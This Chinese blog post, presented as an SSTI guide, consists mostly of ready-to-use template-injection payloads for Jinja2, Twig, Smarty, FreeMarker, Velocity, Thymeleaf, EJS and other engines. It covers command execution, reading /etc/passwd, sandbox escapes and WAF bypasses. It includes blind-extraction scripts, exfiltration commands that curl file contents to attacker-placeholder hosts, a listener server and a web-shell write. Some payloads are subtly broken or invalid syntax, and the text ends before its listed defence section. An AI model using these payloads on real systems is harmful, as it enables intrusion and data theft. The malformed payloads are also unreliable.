---
layout: post
title: "SSTI服务端模板注入完全指南：原理、技巧与防御"
date: 2026-03-16 10:00:00 +0800
categories: [网络安全, Web安全]
tags: [SSTI, 模板注入, 漏洞分析, 安全防御, 渗透测试, Web安全]
author: Security Researcher
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。

## 目录
- [什么是SSTI](#什么是ssti)
- [SSTI原理](#ssti原理)
- [Python模板引擎（Jinja2）](#python模板引擎jinja2)
- [PHP模板引擎（Twig、Smarty）](#php模板引擎twigsmarty)
- [Java模板引擎（FreeMarker、Velocity）](#java模板引擎freemarkervelocity)
- [其他模板引擎](#其他模板引擎)
- [高级利用技巧](#高级利用技巧)
- [自动化工具](#自动化工具)
- [防御措施](#防御措施)
- [CTF实战案例](#ctf实战案例)
- [总结](#总结)

---

## 什么是SSTI

**SSTI（Server-Side Template Injection，服务端模板注入）** 是一种Web安全漏洞，攻击者通过在模板中注入恶意代码，利用模板引擎的执行特性在服务器端执行任意代码。与SQL注入不同，SSTI直接利用模板引擎的解析执行能力，可能导致更严重的安全问题，包括远程代码执行（RCE）。

### SSTI的危害

| 危害类型 | 具体表现 |
|---------|---------|
| 远程代码执行 | 在服务器端执行任意系统命令 |
| 敏感信息泄露 | 读取配置文件、环境变量、源代码等 |
| 文件读取 | 读取服务器上的任意文件 |
| 权限提升 | 获取服务器控制权限 |
| 内网渗透 | 利用服务器作为跳板攻击内网 |

### 常见模板引擎

现代Web应用广泛使用模板引擎来分离业务逻辑和视图层，常见的模板引擎包括：

| 语言 | 模板引擎 |
|------|---------|
| Python | Jinja2、Tornado、Mako |
| PHP | Twig、Smarty、Blade |
| Java | FreeMarker、Velocity、Thymeleaf |
| JavaScript | EJS、Pug、Handlebars |
| Ruby | ERB、Slim、Haml |

---

## SSTI原理

### 模板引擎的工作机制

模板引擎通过将模板文件中的动态占位符替换为实际数据来生成HTML。当用户输入被直接嵌入模板而未经适当过滤时，就可能产生SSTI漏洞。

### 漏洞产生原因

1. **用户输入直接拼接模板**：将用户输入直接拼接到模板字符串中
2. **模板渲染函数误用**：使用不安全的渲染方式处理用户输入
3. **动态模板生成**：根据用户输入动态构建模板内容

### SSTI检测方法

常用的探测Payload：

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

如果页面返回`49`，则可能存在SSTI漏洞。

---

## Python模板引擎（Jinja2）

### Jinja2基础语法

Jinja2是Python最流行的模板引擎，被Flask、Django（可选）等框架广泛使用。了解其基础语法是进行SSTI攻击的前提。

#### 变量表达式 {{ }}

变量表达式用于输出变量的值，是SSTI攻击的主要入口：

```jinja2
{# 输出变量 #}
{{ user.name }}

{# 输出字典值 #}
{{ config['SECRET_KEY'] }}

{# 执行Python表达式 #}
{{ 7 * 7 }}

{# 调用方法 #}
{{ user.get_name() }}
```

#### 控制结构 `{# #}`

控制结构用于逻辑控制，也可能被用于执行恶意代码：

```jinja2
{# 条件判断 #}
{% if user.is_admin %}
    欢迎管理员
{% endif %}

{# 循环 #}
{% for item in items %}
    {{ item.name }}
{% endfor %}

{# 设置变量 #}
{% set x = 'test' %}

{# 宏定义 #}
{% macro input(name, value='') %}
    <input type="text" name="{{ name }}" value="{{ value }}">
{% endmacro %}
```

#### 注释 {# #}

注释语法，可用于隐藏Payload：

```jinja2
{# 这是注释，不会输出到页面 #}
{{ 7*7 }}{# 探测Payload #}
```

#### 过滤器 |

过滤器用于修改变量输出，部分过滤器可被滥用：

```jinja2
{# 字符串过滤器 #}
{{ name|upper }}
{{ name|lower }}
{{ name|replace('a', 'b') }}

{# 危险过滤器 - attr可用于绕过 #}
{{ ()|attr('__class__') }}

{# 安全过滤器 - escape #}
{{ user_input|escape }}
```

---

### Jinja2 SSTI Payload大全

#### 基础探测Payload

首先确认是否存在SSTI漏洞：

```jinja2
{# 数学运算探测 - 如果返回49则存在漏洞 #}
{{ 7*7 }}
{{ 7+7 }}
{{ 7-7 }}
{{ 7/7 }}

{# 字符串操作探测 #}
{{ '7'*7 }}
{{ 'a'+'b' }}

{# 逻辑运算探测 #}
{{ true }}
{{ false }}
{{ none }}

{# 比较运算 #}
{{ 7 == 7 }}
{{ 7 > 5 }}
```

#### 获取配置信息

利用内置对象获取应用敏感信息：

```jinja2
{# 获取Flask配置 #}
{{ config }}
{{ config.items() }}
{{ config['SECRET_KEY'] }}
{{ config.SQLALCHEMY_DATABASE_URI }}

{# 获取request对象信息 #}
{{ request }}
{{ request.headers }}
{{ request.args }}
{{ request.cookies }}
{{ request.remote_addr }}
{{ request.url }}

{# 获取session信息 #}
{{ session }}

{# 获取应用全局变量 #}
{{ g }}

{# 获取当前用户 #}
{{ current_user }}
{{ current_user.__dict__ }}
```

#### 文件读取Payload

利用Python的内置机制读取服务器文件：

```jinja2
{# 方法1：使用file类 #}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

{# 方法2：使用open函数 #}
{{().__class__.__bases__[0].__subclasses__()[92].__init__.__globals__['open']('/etc/passwd').read()}}

{# 方法3：通过__builtins__ #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

{# 方法4：使用io模块 #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('io').open('/etc/passwd').read()}}

{# 方法5：使用pathlib #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('pathlib').Path('/etc/passwd').read_text()}}
```

#### 命令执行Payload

执行系统命令获取服务器控制权：

```jinja2
{# 方法1：使用os.popen #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('whoami').read()}}

{# 方法2：使用os.system（无回显） #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['system']('whoami')}}

{# 方法3：使用subprocess #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('whoami',shell=True)}}

{# 方法4：使用eval执行任意代码 #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}

{# 方法5：使用exec执行任意代码 #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['exec']('import os; print(os.popen("whoami").read())')}}

{# 方法6：使用compile + eval #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval'](().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['compile']('import os;os.system("whoami")','','exec'))}}
```

#### 常用的__class__、__base__、__subclasses__利用链

理解Python的MRO（方法解析顺序）机制是构造利用链的关键：

```jinja2
{# 步骤1：获取对象的类 #}
{{ ''.__class__ }}           {# <class 'str'> #}
{{ [].__class__ }}           {# <class 'list'> #}
{{ {}.__class__ }}           {# <class 'dict'> #}
{{ ().__class__ }}           {# <class 'tuple'> #}

{# 步骤2：获取基类 #}
{{ ''.__class__.__base__ }}       {# <class 'object'> #}
{{ ''.__class__.__bases__[0] }}   {# <class 'object'> #}
{{ ''.__class__.__mro__[1] }}     {# <class 'object'> #}

{# 步骤3：获取所有子类 #}
{{ ''.__class__.__bases__[0].__subclasses__() }}

{# 步骤4：查找可利用的子类索引 #}
{# 常用可利用类：warnings.catch_warnings (约第177个) #}
{# site._Printer (约第72个) #}
{# os._wrap_close (约第137个) #}

{# 步骤5：获取子类的__init__方法 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__ }}

{# 步骤6：获取__init__的全局变量 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__ }}

{# 步骤7：获取__builtins__ #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__'] }}

{# 步骤8：执行任意代码 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()') }}
```

**常用子类索引参考：**

```jinja2
{# 查找os._wrap_close类 #}
{# 通常索引在130-140之间，需要根据实际情况调整 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137] }}

{# 查找warnings.catch_warnings类 #}
{# 通常索引在170-180之间 #}
{{ ''.__class__.__bases__[0].__subclasses__()[177] }}

{# 查找subprocess.Popen类 #}
{# 通常索引在240-260之间 #}
{{ ''.__class__.__bases__[0].__subclasses__()[245] }}

{# 查找site._Printer类 #}
{# 通常索引在70-80之间 #}
{{ ''.__class__.__bases__[0].__subclasses__()[72] }}
```

---

### Jinja2沙箱逃逸

#### 沙箱机制说明

Jinja2提供了沙箱环境（SandboxedEnvironment）来限制模板中的危险操作：

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string('{{ user_input }}')  # 受限执行
```

沙箱会限制：
- 属性访问（`__class__`, `__bases__`等）
- 危险内置函数（`eval`, `exec`, `open`等）
- 模块导入

#### 逃逸技术详解

**1. 使用|attr过滤器绕过属性限制：**

```jinja2
{# 正常方式被过滤 #}
{{().__class__}}  {# 可能被拦截 #}

{# 使用attr过滤器绕过 #}
{{()|attr('__class__')}}
{{()|attr('__class__')|attr('__bases__')|attr('__getitem__')(0)|attr('__subclasses__')()}}

{# 链式调用 #}
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(137)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('whoami')|attr('read')()}}
```

**2. 使用request对象绕过：**

```jinja2
{# 通过request对象获取应用上下文 #}
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}

{# 获取config对象 #}
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('config')}}

{# 获取self #}
{{self|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("id").read()')}}
```

**3. 使用config对象绕过：**

```jinja2
{# 通过config获取全局对象 #}
{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
```

**4. 使用字符串拼接绕过关键词过滤：**

```jinja2
{# 如果__class__被过滤 #}
{{()['__cl'+'ass__']}}
{{()['__c'+'la'+'ss__']}}

{# 使用join #}
{{()|attr(['__cl','ass__']|join)}}}

{# 使用format #}
{{()|attr('__cl{0}ss__'.format('a'))}}

{# 使用replace #}
{{()|attr('__clXss__'|replace('X','a'))}}
```

**5. 使用Unicode编码绕过：**

```jinja2
{# Unicode编码绕过 #}
{{()|attr('\x5f\x5fclass\x5f\x5f')}}
{{()|attr('__class__')}}
```

**6. 使用八进制/十六进制编码：**

```jinja2
{# 八进制编码 #}
{{()|attr('\_\_class\_\_')}}

{# 使用chr函数构造字符串 #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval'](''.__class__([x for x in [95,95,99,108,97,115,115,95,95]]))}}
```

**7. 使用模板继承绕过：**

```jinja2
{# 利用extends和super #}
{% extends 'layout.html' %}
{% block content %}
{{self.__class__}}
{% endblock %}
```

**8. 使用namespace对象：**

```jinja2
{# Python 3中的namespace对象 #}
{% set ns = namespace() %}
{% set ns.a = ''.__class__ %}
{{ns.a}}
```

#### 各种绕过方法汇总

```jinja2
{# === 方法1：基础利用链 === #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('whoami').read()}}

{# === 方法2：使用attr过滤器 === #}
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(137)|attr('__init__')|attr('__globals__')|attr('get')('popen')('whoami')|attr('read')()}}

{# === 方法3：使用request对象 === #}
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("id").read()')}}

{# === 方法4：使用config对象 === #}
{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}

{# === 方法5：使用session对象 === #}
{{session|attr('__class__')|attr('__init__')|attr('__globals__')}}

{# === 方法6：使用g对象 === #}
{{g|attr('__class__')|attr('__init__')|attr('__globals__')}}

{# === 方法7：使用lipsum对象（Flask内置）=== #}
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}

{# === 方法8：使用cycler对象 === #}
{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("id").read()')}}

{# === 方法9：使用joiner对象 === #}
{{joiner|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}

{# === 方法10：使用namespace对象 === #}
{% set ns = namespace() %}
{% set ns.a = ().__class__ %}
{{ns.a.__base__.__subclasses__()[137].__init__.__globals__['popen']('whoami').read()}}

{# === 方法11：使用dict构造 === #}
{{({}|attr('__class__')).__base__.__subclasses__()[137].__init__.__globals__['popen']('whoami').read()}}

{# === 方法12：使用list构造 === #}
{{([].__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('whoami').read())}}

{# === 方法13：使用tuple构造 === #}
{{(((),).__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('whoami').read())}}

{# === 方法14：使用str构造 === #}
{{(''.__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('whoami').read())}}

{# === 方法15：使用bytes构造 === #}
{{((b'').__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('whoami').read())}}
```

---

## PHP模板引擎（Twig、Smarty）

### Twig模板引擎

Twig是Symfony框架的默认模板引擎。

#### 基础检测

```twig
{{7*7}}
```

#### 利用方法

Twig 1.x版本存在沙箱绕过漏洞：

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Twig 2.x/3.x版本限制较多，主要利用对象属性访问：

```twig
{{app.request.server.all}}
{{app.request.headers.all}}
```

### Smarty模板引擎

Smarty是PHP的老牌模板引擎。

#### 基础检测

```smarty
{7*7}
```

#### 利用方法

```smarty
# 读取文件
{fetch file='file:///etc/passwd'}

# 执行PHP代码（Smarty 3.x）
{php}echo system('id');{/php}

# 使用Smarty内置函数
{system('ls')}

# 通过self获取Smarty对象
{self::getStreamVariable('file:///etc/passwd')}
```

---

## Java模板引擎（FreeMarker、Velocity）

### FreeMarker

FreeMarker是Java生态中广泛使用的模板引擎。

#### 基础检测

```freemarker
${7*7}
```

#### 利用方法

```freemarker
# 执行系统命令
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# 读取文件
${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileInputStream","/etc/passwd")}

# 使用API获取信息
${.data_model}
${.globals}
${.locals}
```

### Velocity

Velocity是Apache的模板引擎。

#### 基础检测

```velocity
#set($a=7*7)
$a
```

#### 利用方法

```velocity
#set($e="e")
#set($ec=$e.getClass().forName("java.lang.Runtime"))
#set($rt=$ec.getRuntime())
#set($cmd=$rt.exec("id"))
#set($out=$cmd.getInputStream())
```

---

## 其他模板引擎

### Ruby ERB

```erb
<%= 7*7 %>
<%= system('id') %>
<%= `whoami` %>
<%= IO.popen('id').read %>
```

### Node.js EJS

```ejs
<%= 7*7 %>
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

### Handlebars

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## 高级利用技巧

### 无回显利用方法

当SSTI漏洞存在但命令执行结果不显示在页面上时，需要使用无回显利用技术。

#### 盲注技术（布尔盲注、时间盲注）

**布尔盲注**：

通过条件判断和页面响应差异来提取信息：

```jinja2
{# 判断文件是否存在 - 布尔盲注 #}
{% if ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('/flag').read() %}true{% endif %}

{# 逐字符提取 - 布尔盲注 #}
{% if ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('/flag').read()[0] == 'f' %}true{% endif %}

{# 使用Python脚本自动化盲注 #}
```

**Python盲注脚本示例**：

```python
import requests
import string

url = "http://target.com/page"
flag = ""

for i in range(50):
    for char in string.printable:
        payload = f"{{{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('/flag').read()[{i}] == '{char}' }}}}}}"
        response = requests.get(url, params={"name": payload})
        if "true" in response.text:
            flag += char
            print(f"[+] Found: {flag}")
            break
    if flag.endswith('}'):
        break

print(f"[*] Flag: {flag}")
```

**时间盲注**：

通过延时响应来判断条件：

```jinja2
{# 时间盲注 - 如果条件成立则延时5秒 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("time").sleep(5) if open("/flag").read()[0] == "f" else 0') }}

{# 使用条件表达式 #}
{{ ().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("time").sleep(3)') if ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('/flag').read()[0] == 'f' else '' }}
```

**时间盲注Python脚本**：

```python
import requests
import time
import string

url = "http://target.com/page"
flag = ""

for i in range(50):
    for char in string.printable:
        payload = f"{{{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__(\"time\").sleep(2) if open(\"/flag\").read()[{i}] == \"{char}\" else 0') }}}}}"
        start = time.time()
        response = requests.get(url, params={"name": payload})
        elapsed = time.time() - start
        
        if elapsed > 1.5:
            flag += char
            print(f"[+] Found: {flag}")
            break
    if flag.endswith('}'):
        break

print(f"[*] Flag: {flag}")
```

#### DNS外带（OOB）利用

利用DNS请求将数据外带，适用于出网环境：

```jinja2
{# DNS外带 - 将命令执行结果通过DNS查询发送 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("curl `whoami`.your-dns-server.com").read()') }}

{# 使用nslookup #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("nslookup `whoami`.your-dns-server.com").read()') }}

{# 使用ping #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ping -c 1 `whoami`.your-dns-server.com").read()') }}

{# 读取文件内容外带 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("curl http://your-dns-server/`cat /flag | base64 | tr -d \"\\n\"`").read()') }}
```

**使用Burp Collaborator或DNSLog**：

```jinja2
{# 使用Burp Collaborator #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("urllib.request").urlopen("http://' + ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('/flag').read() + '.xxx.burpcollaborator.net")') }}

{# 使用DNSLog.cn #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("nslookup `whoami`.your-subdomain.dnslog.cn")') }}
```

#### HTTP请求外带

通过HTTP请求将数据发送到攻击者服务器：

```jinja2
{# HTTP GET请求外带 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("urllib.request").urlopen("http://your-server:8888/?data=" + __import__("os").popen("id").read())') }}

{# 使用curl #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("curl -X POST http://your-server:8888/ -d \"data=`id`\"")') }}

{# 读取文件并外带 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("urllib.request").urlopen("http://your-server:8888/?file=" + __import__("base64").b64encode(__import__("os").popen("cat /flag").read().encode()).decode())') }}

{# 使用wget #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("wget --post-data=\"data=`cat /flag`\" http://your-server:8888/")') }}
```

**攻击者监听服务器（Python）**：

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Received: {self.path}")
        self.send_response(200)
        self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"[+] Received POST: {post_data.decode()}")
        self.send_response(200)
        self.end_headers()

server = HTTPServer(('0.0.0.0', 8888), Handler)
print("[*] Listening on port 8888...")
server.serve_forever()
```

#### 错误信息利用

通过触发错误来获取敏感信息：

```jinja2
{# 触发属性错误获取类信息 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['nonexistent'] }}

{# 触发类型错误 #}
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('/flag').read()[1000] }}

{# 触发ZeroDivisionError #}
{{ 1/0 }}

{# 触发KeyError获取字典键 #}
{{ config['__nonexistent_key__'] }}

{# 触发AttributeError获取对象属性 #}
{{ request.nonexistent_attribute }}
```

**利用模板调试模式**：

```jinja2
{# 如果开启了调试模式，可能泄露更多信息 #}
{{ config }}
{{ self.__dict__ }}
{{ request.__dict__ }}
{{ request.application.__dict__ }}
```

---

### 沙箱逃逸进阶技术

#### Python沙箱逃逸（多种绕过方法）

**1. 利用内置对象链**：

```jinja2
{# 基础利用链 #}
{{ ''.__class__.__mro__[1].__subclasses__() }}

{# 通过warnings.catch_warnings类 #}
{{ ''.__class__.__mro__[1].__subclasses__()[177].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()') }}

{# 通过os._wrap_close类 #}
{{ ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['popen']('id').read() }}

{# 通过subprocess.Popen类 #}
{{ ''.__class__.__mro__[1].__subclasses__()[245]('id', shell=True, stdout=-1).communicate()[0].strip() }}
```

**2. 利用code.InteractiveInterpreter**：

```jinja2
{# 通过code模块执行交互式代码 #}
{{ ''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['__import__']('code').InteractiveInterpreter().runsource('import os; os.system("id")') }}
```

**3. 利用types.FunctionType创建函数**：

```jinja2
{# 利用FunctionType创建新函数 #}
{% set ft = ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('types').FunctionType %}
{% set code = ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['compile']('import os; os.system("id")', '', 'exec') %}
{{ ft(code, {})() }}
```

**4. 利用BuiltinImporter加载模块**：

```jinja2
{# 通过BuiltinImporter加载os模块 #}
{{ ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('_frozen_importlib').BuiltinImporter.load_module('os').popen('id').read() }}
```

**5. 利用sys.modules**：

```jinja2
{# 通过sys.modules获取已加载的模块 #}
{{ ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
```

**6. 利用object.__reduce__**：

```jinja2
{# 利用reduce方法 #}
{{ ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('pickle').loads(b'cos\nsystem\n(Vid\ntR.') }}
```

**7. 利用frame对象**：

```jinja2
{# 通过frame对象获取更高作用域 #}
{{ [x for x in ''.__class__.__mro__[1].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['eval']('__import__("os").popen("id").read()') }}
```

**8. 利用字符串格式化**：

```jinja2
{# 利用format方法获取全局变量 #}
{{ '{0.__class__.__mro__[1].__subclasses__}'.format('') }}
{{ '{0.__globals__}'.format(''.__class__.__mro__[1].__subclasses__()[137].__init__) }}
```

**9. 利用装饰器语法**：

```jinja2
{# 利用装饰器执行代码 #}
{% set dec = lambda f: f.__globals__.__builtins__.__import__('os').popen('id').read() %}
{% @dec %}
{% def test(): pass %}
{% enddef %}
```

**10. 利用生成器表达式**：

```jinja2
{# 利用生成器表达式 #}
{{ (x for x in [__import__('os').popen('id').read()]).__next__() }}
```

#### Java沙箱逃逸

**FreeMarker沙箱逃逸**：

```freemarker
{# 利用Execute类执行命令 #}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

{# 利用ObjectConstructor创建对象 #}
<#assign obj="freemarker.template.utility.ObjectConstructor"?new()>
<#assign proc=obj("java.lang.ProcessBuilder", ["bash", "-c", "id"])>
<#assign is=proc.getInputStream()>
<#assign br=obj("java.io.BufferedReader", obj("java.io.InputStreamReader", is))>
<#assign line=br.readLine()>
${line}

{# 利用JythonRuntime #}
<#assign rt="freemarker.ext.jython.JythonRuntime"?new()>
<@rt>import os; print(os.system("id"))</@rt>

{# 利用BeansWrapper #}
<#assign classLoader=object.__class__.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign runtime=clazz.getMethod("getRuntime").invoke(null)>
<#assign process=runtime.exec("id")>
```

**Velocity沙箱逃逸**：

```velocity
#set($str="")
#set($class=$str.getClass().forName("java.lang.Runtime"))
#set($runtime=$class.getRuntime())
#set($process=$runtime.exec("id"))
#set($out=$process.getInputStream())
#set($reader=$str.getClass().forName("java.io.InputStreamReader").getConstructor($str.getClass().forName("java.io.InputStream")).newInstance($out))
#set($buffer=$str.getClass().forName("java.io.BufferedReader").getConstructor($str.getClass().forName("java.io.Reader")).newInstance($reader))
#set($line=$buffer.readLine())
$line
```

**Thymeleaf沙箱逃逸**：

```thymeleaf
{# 利用预处理表达式 #}
__${T(java.lang.Runtime).getRuntime().exec('id')}__

{# 利用表达式对象 #}
${#objects.nullSafe(#httpServletRequest.getSession().getAttribute('cmd'), 'id')}

{# 利用Spring表达式 #}
${@org.springframework.util.ResourceUtils@getFile('file:///etc/passwd')}
```

#### PHP沙箱逃逸

**Twig沙箱逃逸**：

```twig
{# Twig 1.x - 利用self对象 #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# Twig 2.x/3.x - 利用map过滤器 #}
{{["id"]|map("system")|join}}

{# 利用filter过滤器 #}
{{["id"]|filter("system")|join}}

{# 利用reduce过滤器 #}
{{["id"]|reduce("system")}}

{# 利用sort过滤器 #}
{{["id"]|sort("system")}}
```

**Smarty沙箱逃逸**：

```smarty
{* 使用php标签 *}
{php}echo system('id');{/php}

{* 使用fetch函数 *}
{fetch file='file:///etc/passwd'}

{* 使用self获取Smarty对象 *}
{self::getStreamVariable('file:///etc/passwd')}

{* 使用Smarty_Internal_Write_File *}
{Smarty_Internal_Write_File::writeFile('/tmp/shell.php', '<?php system($_GET["cmd"]); ?>', $smarty)}
```

**Blade沙箱逃逸**：

```blade
{{-- 利用PHP标签 --}}
@php echo system('id'); @endphp

{{-- 利用unescaped输出 --}}
{!! system('id') !!}

{{-- 利用注入的PHP代码 --}}
{{ $_GET['cmd'] }}
```

---

### WAF绕过技巧

#### 关键字过滤绕过（字符串拼接、编码）

**1. 字符串拼接绕过**：

```jinja2
{# 基础字符串拼接 #}
{{()['__cl'+'ass__']}}
{{()['__c'+'la'+'ss__']}}

{# 使用join过滤器 #}
{{()|attr(['__cl','ass__']|join)}}}

{# 使用format方法 #}
{{()|attr('__cl{0}ss__'.format('a'))}}

{# 使用replace过滤器 #}
{{()|attr('__clXss__'|replace('X','a'))}}

{# 使用reverse过滤器 #}
{{()|attr('__ssalc__'|reverse)}}

{# 使用slice和join #}
{% set a = '__c' %}
{% set b = 'lass__' %}
{{()|attr(a+b)}}
```

**2. Unicode编码绕过**：

```jinja2
{# Unicode转义序列 #}
{{()|attr('\x5f\x5fclass\x5f\x5f')}}
{{()|attr('\u005f\u005fclass\u005f\u005f')}}

{# 使用chr函数构造 #}
{{()|attr(''.__class__([x for x in [95,95,99,108,97,115,115,95,95]]))}}

{# 使用bytes和decode #}
{{()|attr((b'\x5f\x5fclass\x5f\x5f').decode())}}
```

**3. 十六进制/八进制编码**：

```jinja2
{# 十六进制编码 #}
{{()|attr('__\x63lass__')}}

{# 八进制编码 #}
{{()|attr('__\143lass__')}}

{# 混合编码 #}
{{()|attr('__c\x6c\x61ss__')}}
```

**4. Base64编码绕过**：

```jinja2
{# 使用base64解码 #}
{{()|attr(''.__class__([x for x in ''.__class__(['X19jbGFzc19f'], encoding='ascii').decode('base64')]))}}

{# 更简洁的方式 #}
{% set b64 = 'X19jbGFzc19f' %}
{{()|attr(b64.decode('base64'))}}
```

#### 空格过滤绕过

```jinja2
{# 使用括号代替空格 #}
{{().__class__.__base__.__subclasses__()[137]}}

{# 使用换行符 #}
{{().__class__
.__base__
.__subclasses__()[137]}}

{# 使用注释 #}
{{().__class__/*注释*/.__base__}}

{# 使用+号连接（某些情况） #}
{{''+().__class__}}

{# 使用~号连接 #}
{{''~().__class__}}
```

#### 特殊字符绕过

**1. 点号过滤绕过**：

```jinja2
{# 使用attr过滤器代替点号 #}
{{()|attr('__class__')|attr('__base__')}}

{# 使用__getitem__代替中括号 #}
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(137)}}

{# 使用get方法 #}
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('pop')(137)}}
```

**2. 下划线过滤绕过**：

```jinja2
{# 使用Unicode全角下划线 #}
{{()|attr('＿＿class＿＿')}}

{# 使用request对象绕过下划线 #}
{{request|attr('application')}}

{# 使用内置对象 #}
{{lipsum|attr('__globals__')}}
